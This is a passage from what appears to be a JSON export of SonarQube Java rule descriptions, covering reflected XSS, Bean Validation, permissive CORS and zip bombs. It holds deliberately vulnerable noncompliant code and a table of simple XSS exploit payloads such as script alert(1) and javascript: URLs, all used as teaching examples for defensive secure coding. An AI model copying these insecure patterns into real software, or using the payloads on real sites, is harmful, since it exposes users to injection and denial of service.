Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the applicationâs security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>How to fix it in Thymeleaf</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting.</p>\n<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"noncompliant\">\n&lt;body&gt;\n    &lt;p th:utext=\"Hello, ${input}!\" /&gt; &lt;!-- Noncompliant --&gt;\n    &lt;p&gt;Hello, [(${input})]!&lt;/p&gt;       &lt;!-- Noncompliant --&gt;\n&lt;/body&gt;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"compliant\">\n&lt;body&gt;\n    &lt;p th:text=\"Hello, ${input}!\" /&gt;\n    &lt;p&gt;Hello, [[${input}]]!&lt;/p&gt;\n&lt;/body&gt;\n</pre>\n<h3>How does this work?</h3>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end userâs point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<p>For HTML encoding, JavaScript encoding, and CSS encoding, the documentation allows the use of <code>unescaped text</code>, in only two different\nways:</p>\n<ul>\n  <li> with the attribute <code>th:utext</code>. </li>\n  <li> with the inline expression <code>[(â¦â)]</code>. </li>\n</ul>\n<p>If you insert third party data into the pages, the regular attributes are preferable:</p>\n<ul>\n  <li> with the attribute <code>th:text</code>. </li>\n  <li> The inline expression <code>[[â¦â]]</code>. </li>\n</ul>\n<p>They ensure that the correct encoding is used, regardless of the context in which the user-controlled data is inserted. Thus, it is not necessary\nto specify a particular encoder.</p>\n<h3>Pitfalls</h3>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the applicationâs security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>How to fix it in a NanoHTTPD</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>\n<p>Third-party data, such as user input, is not to be trusted. If embedded in HTML code, it should be HTML-encoded to prevent the injection of\nadditional code. This can be done with the <a href=\"https://owasp.org/www-project-java-encoder/\">OWASP Java Encoder</a> or similar libraries.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"41\" data-diff-type=\"noncompliant\">\nimport fi.iki.elonen.NanoHTTPD;\n\npublic class App extends NanoHTTPD {\n\n    @Override\n    public Response serve(IHTTPSession session) {\n        String name = session.getParms().get(\"input\");\n        return newFixedLengthResponse( // Noncompliant\n            \"&lt;html&gt;&lt;body&gt;&lt;h1&gt; Hello, \" + name + \"!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\"\n        );\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"41\" data-diff-type=\"compliant\">\nimport fi.iki.elonen.NanoHTTPD;\nimport org.owasp.encoder.Encode;\n\npublic class App extends NanoHTTPD {\n\n    @Override\n    public Response serve(IHTTPSession session) {\n        String name = session.getParms().get(\"input\");\n        return newFixedLengthResponse(\n            \"&lt;html&gt;&lt;body&gt;&lt;h1&gt; Hello, \" + Encode.forHtml(name) + \"!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\"\n        );\n    }\n}\n</pre>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response with the\nContent-Type header.</p>\n<p>For example, setting the Content-Type to <code>text/plain</code> allows to safely reflect user input. In this case, browsers will not try to parse\nand execute the response.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"42\" data-diff-type=\"noncompliant\">\nimport fi.iki.elonen.NanoHTTPD;\n\npublic class App extends NanoHTTPD {\n\n    @Override\n    public Response serve(IHTTPSession session) {\n        String name = session.getParms().get(\"input\");\n        return newFixedLengthResponse( // Noncompliant - text/html by default\n            \"Hello, \" + name + \"!\"\n        );\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"42\" data-diff-type=\"compliant\">\nimport fi.iki.elonen.NanoHTTPD;\nimport fi.iki.elonen.NanoHTTPD.Response.Status;\n\npublic class App extends NanoHTTPD {\n\n    @Override\n    public Response serve(IHTTPSession session) {\n        String name = session.getParms().get(\"input\");\n        return newFixedLengthResponse(\n            Status.OK,\n            \"text/plain\",\n            \"Hello, \" + name + \"!\"\n        );\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end userâs point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<p><code>org.owasp.encoder.Encode.forHtml</code> is the recommended method to encode HTML entities.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the applicationâs security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">XSS Prevention Cheat\n  Sheet</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-java-encoder/\">OWASP Java Encoder</a> </li>\n  <li> Spring - <a href=\"https://spring.io/guides/gs/securing-web/\">Securing a Web Application</a> </li>\n  <li> Thymeleaf - <a href=\"https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html\">Tutorial: Using Thymeleaf</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> SonarSource - <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> SonarSource - <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> Samy Kamkar - <a href=\"https://samy.pl/myspace/\">The MySpace Worm</a> </li>\n  <li> James Kettle, PortSwigger - <a href=\"https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens\">Web Storage: The Lesser\n  Evil for Session Tokens</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222602\">Application Security and\n  Development: V-222602</a> - The application must protect from Cross-Site Scripting (XSS) vulnerabilities. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5131","summary":"Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p><code>Bean Validation</code> as per defined by JSR 380 can be triggered programmatically or also executed by the <code>Bean Validation</code>\nproviders. However something should tell the <code>Bean Validation</code> provider that a variable must be validated otherwise no validation will\nhappen. This can be achieved by annotating a variable with <code>javax.validation.Valid</code> and unfortunally itâs easy to forget to add this\nannotation on complex Beans.</p>\n<p>Not annotating a variable with <code>@Valid</code> means <code>Bean Validation</code> will not be triggered for this variable, but readers may\noverlook this omission and assume the variable will be validated.</p>\n<p>This rule will run by default on all <code>Class</code>'es and therefore can generate a lot of noise. This rule should be restricted to run only on\ncertain layers. For this reason, the \"Restrict Scope of Coding Rules\" feature should be used to check for missing <code>@Valid</code> annotations only\non some packages of the application.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nimport javax.validation.Valid;\nimport javax.validation.constraints.NotNull;\n\npublic class User {\n  @NotNull\n  private String name;\n}\n\npublic class Group {\n  @NotNull\n  private List&lt;User&gt; users; // Noncompliant; User instances are not validated\n}\n\npublic class MyService {\n  public void login(User user) { // Noncompliant; parameter \"user\" is not validated\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport javax.validation.Valid;\nimport javax.validation.constraints.NotNull;\n\npublic class User {\n  @NotNull\n  private String name;\n}\n\npublic class Group {\n  @Valid\n  @NotNull\n  private List&lt;User&gt; users; // Compliant; User instances are validated\n\n  @NotNull\n  // preferred style as of Bean Validation 2.0\n  private List&lt;@Valid User&gt; users2; // Compliant; User instances are validated\n}\n\npublic class MyService {\n  public void login(@Valid User user) { // Compliant\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://beanvalidation.org/2.0/spec/\">Bean Validation 2.0 (JSR 380)</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5128","summary":"\"Bean Validation\" (JSR 380) should be properly configured","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You donât trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Java servlet framework:</p>\n<pre>\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    resp.setHeader(\"Content-Type\", \"text/plain; charset=utf-8\");\n    resp.setHeader(\"Access-Control-Allow-Origin\", \"*\"); // Sensitive\n    resp.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n    resp.setHeader(\"Access-Control-Allow-Methods\", \"GET\");\n    resp.getWriter().write(\"response\");\n}\n</pre>\n<p>Spring MVC framework:</p>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html\">CrossOrigin</a>\n  </li>\n</ul>\n<pre>\n@CrossOrigin // Sensitive\n@RequestMapping(\"\")\npublic class TestController {\n    public String home(ModelMap model) {\n        model.addAttribute(\"message\", \"ok \");\n        return \"view\";\n    }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html\">cors.CorsConfiguration</a> </li>\n</ul>\n<pre>\nCorsConfiguration config = new CorsConfiguration();\nconfig.addAllowedOrigin(\"*\"); // Sensitive\nconfig.applyPermitDefaultValues(); // Sensitive\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html\">servlet.config.annotation.CorsConfiguration</a> </li>\n</ul>\n<pre>\nclass Insecure implements WebMvcConfigurer {\n  @Override\n  public void addCorsMappings(CorsRegistry registry) {\n    registry.addMapping(\"/**\")\n      .allowedOrigins(\"*\"); // Sensitive\n  }\n}\n</pre>\n<p>User-controlled origin:</p>\n<pre>\npublic ResponseEntity&lt;String&gt; userControlledOrigin(@RequestHeader(\"Origin\") String origin) {\n  HttpHeaders responseHeaders = new HttpHeaders();\n  responseHeaders.add(\"Access-Control-Allow-Origin\", origin); // Sensitive\n\n  return new ResponseEntity&lt;&gt;(\"content\", responseHeaders, HttpStatus.CREATED);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Java Servlet framework:</p>\n<pre>\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    resp.setHeader(\"Content-Type\", \"text/plain; charset=utf-8\");\n    resp.setHeader(\"Access-Control-Allow-Origin\", \"trustedwebsite.com\"); // Compliant\n    resp.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n    resp.setHeader(\"Access-Control-Allow-Methods\", \"GET\");\n    resp.getWriter().write(\"response\");\n}\n</pre>\n<p>Spring MVC framework:</p>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html\">CrossOrigin</a>\n  </li>\n</ul>\n<pre>\n@CrossOrigin(\"trustedwebsite.com\") // Compliant\n@RequestMapping(\"\")\npublic class TestController {\n    public String home(ModelMap model) {\n        model.addAttribute(\"message\", \"ok \");\n        return \"view\";\n    }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html\">cors.CorsConfiguration</a> </li>\n</ul>\n<pre>\nCorsConfiguration config = new CorsConfiguration();\nconfig.addAllowedOrigin(\"http://domain2.com\"); // Compliant\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html\">servlet.config.annotation.CorsConfiguration</a> </li>\n</ul>\n<pre>\nclass Safe implements WebMvcConfigurer {\n  @Override\n  public void addCorsMappings(CorsRegistry registry) {\n    registry.addMapping(\"/**\")\n      .allowedOrigins(\"safe.com\"); // Compliant\n  }\n}\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\npublic ResponseEntity&lt;String&gt; userControlledOrigin(@RequestHeader(\"Origin\") String origin) {\n  HttpHeaders responseHeaders = new HttpHeaders();\n  if (trustedOrigins.contains(origin)) {\n    responseHeaders.add(\"Access-Control-Allow-Origin\", origin);\n  }\n\n  return new ResponseEntity&lt;&gt;(\"content\", responseHeaders, HttpStatus.CREATED);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5122","summary":"Having a permissive Cross-Origin Resource Sharing policy is security-sensitive","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular itâs not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nFile f = new File(\"ZipBomb.zip\");\nZipFile zipFile = new ZipFile(f);\nEnumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries(); // Sensitive\n\nwhile(entries.hasMoreElements()) {\n  ZipEntry ze = entries.nextElement();\n  File out = new File(\"./output_onlyfortesting.txt\");\n  Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Do not rely on <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/zip/ZipEntry.html#getSize()\">getsize</a> to retrieve the size of an\nuncompressed entry because this method returns what is defined in the archive headers which can be forged by attackers, instead calculate the actual\nentry size when unzipping it:</p>\n<pre>\nFile f = new File(\"ZipBomb.zip\");\nZipFile zipFile = new ZipFile(f);\nEnumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n\nint THRESHOLD_ENTRIES = 10000;\nint THRESHOLD_SIZE = 1000000000; // 1 GB\ndouble THRESHOLD_RATIO = 10;\nint totalSizeArchive = 0;\nint totalEntryArchive = 0;\n\nwhile(entries.hasMoreElements()) {\n  ZipEntry ze = entries.nextElement();\n  InputStream in = new BufferedInputStream(zipFile.getInputStream(ze));\n  OutputStream out = new BufferedOutputStream(new 